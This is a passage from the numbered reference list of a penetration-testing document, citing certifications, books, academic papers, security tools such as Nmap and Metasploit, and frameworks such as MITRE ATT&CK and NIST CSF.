### Certifications & Training
90. OffSec OSCP/OSCP+ (PEN-200) — https://www.offsec.com/courses/pen-200/
91. GIAC GPEN — https://www.giac.org/certifications/penetration-tester-gpen/
92. CREST Registered Penetration Tester (CRT) — https://www.crest-approved.org/skills-certifications-careers/crest-registered-penetration-tester/
93. CompTIA PenTest+ (PT0-003) — https://www.comptia.org/certifications/pentest/
94. SANS SEC560: Enterprise Penetration Testing — https://www.sans.org/cyber-security-courses/enterprise-penetration-testing/
95. SANS SEC588: Cloud Penetration Testing — https://www.sans.org/cyber-security-courses/cloud-penetration-testing/

### Books
96. Kennedy, D. et al., "Metasploit: The Penetration Tester's Guide" 2nd Ed. (No Starch Press, 2024) — https://nostarch.com/metasploit-2nd-edition
97. Wilhelm, T., "Professional Penetration Testing" 3rd Ed. (Elsevier, 2025) — https://shop.elsevier.com/books/professional-penetration-testing/wilhelm/978-0-443-26478-8
98. Weidman, G., "Penetration Testing: A Hands-On Introduction to Hacking" (No Starch Press, 2014)
99. Shostack, A., "Threat Modeling: Designing for Security" (Wiley, 2014)
100. Whitaker, A. & Newman, D.P., "Penetration Testing and Network Defense" (Cisco Press, 2005)
101. Baloch, R., "Ethical Hacking and Penetration Testing Guide" (CRC Press, 2017)

### Academic Papers
102. Knowles, W. et al., "Standardised Penetration Testing? Examining the Usefulness of Current PT Methodologies" (ResearchGate, 2019) — https://www.researchgate.net/publication/335652869
103. Imtias, M.B. et al., "Comparative Analysis of PT Frameworks: OWASP, PTES, NIST SP 800-115" (JAIC, Dec 2025) — https://jurnal.polibatam.ac.id/index.php/JAIC/article/view/9846
104. ESSecA: Automated Penetration Testing (ACM, 2024) — https://dl.acm.org/doi/fullHtml/10.1145/3664476.3670459
105. "Penetration Testing for System Security: Methods and Practical Approaches" (arXiv, 2025) — https://arxiv.org/html/2505.19174v2
106. Scarfone, K.A. et al., "NIST SP 800-115" (2008) — https://doi.org/10.6028/NIST.SP.800-115
107. Scandariato, R. et al., "A Descriptive Study of Microsoft's Threat Modeling Technique" (Springer RE Journal, 2015)
108. Johnstone, M., "Threat Modelling with STRIDE and UML" (Australian ISMC, 2010)
109. Opdahl, A.L. & Sindre, G., "Experimental Comparison of Attack Trees and Misuse Cases" (IST Journal, 2009)

### Tools & Platforms
110. Nmap Reference Guide — https://nmap.org/docs.html
111. Metasploit Framework — https://www.metasploit.com/
112. Kali Linux Documentation — https://www.kali.org/docs/
113. Burp Suite Documentation — https://portswigger.net/burp/documentation
114. Nuclei — https://docs.projectdiscovery.io/
115. BloodHound CE — https://github.com/SpecterOps/BloodHound
116. Prowler — https://docs.prowler.cloud/
117. ScoutSuite — https://github.com/nccgroup/ScoutSuite
118. Frida — https://frida.re/docs/home/
119. MobSF — https://mobsf.github.io/docs/
120. OWASP ZAP — https://www.zaproxy.org/docs/

### Industry Frameworks
121. MITRE ATT&CK Enterprise Matrix — https://attack.mitre.org/
122. MITRE CAPEC — https://capec.mitre.org/
123. Cyber Kill Chain (Lockheed Martin) — https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html
124. CISA Binding Operational Directive (BOD) 24-02
125. NIST Cybersecurity Framework (CSF) 2.0 — https://www.nist.gov/cyberframework
